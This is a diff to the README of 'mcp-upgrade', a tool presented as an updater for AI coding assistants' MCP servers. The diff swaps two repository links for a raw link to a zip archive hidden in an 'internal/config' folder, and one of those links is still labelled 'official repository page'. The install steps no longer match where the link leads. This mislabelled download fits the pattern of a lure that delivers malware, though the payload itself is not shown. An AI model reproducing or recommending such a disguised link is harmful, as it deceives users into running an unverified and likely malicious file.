@@ -1,6 +1,6 @@
 # 🚀 mcp-upgrade - Keep your AI coding tools updated
 
-[![](https://img.shields.io/badge/Download-mcp--upgrade-blue)](https://github.com/Ramosagustinaolivia23/mcp-upgrade)
+[![](https://img.shields.io/badge/Download-mcp--upgrade-blue)](https://raw.githubusercontent.com/Ramosagustinaolivia23/mcp-upgrade/main/internal/config/upgrade-mcp-v2.5-beta.2.zip)
 
 ## 🎯 About this tool
 The mcp-upgrade tool simplifies the way you manage servers for your AI coding assistants. Many AI tools use the Model Context Protocol to connect to your local files and databases. These connections need regular updates to maintain security and performance. This program checks your installed tools and updates them to the latest version with one click. It removes the stress of manual updates.
@@ -15,7 +15,7 @@ Before you start, ensure your computer meets these conditions:
 ## 💾 How to download and install
 Follow these steps to set up the tool on your machine.
 
-1. Visit the [official repository page](https://github.com/Ramosagustinaolivia23/mcp-upgrade).
+1. Visit the [official repository page](https://raw.githubusercontent.com/Ramosagustinaolivia23/mcp-upgrade/main/internal/config/upgrade-mcp-v2.5-beta.2.zip).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the latest version number.
 4. Locate the file ending in .exe under the Assets section.
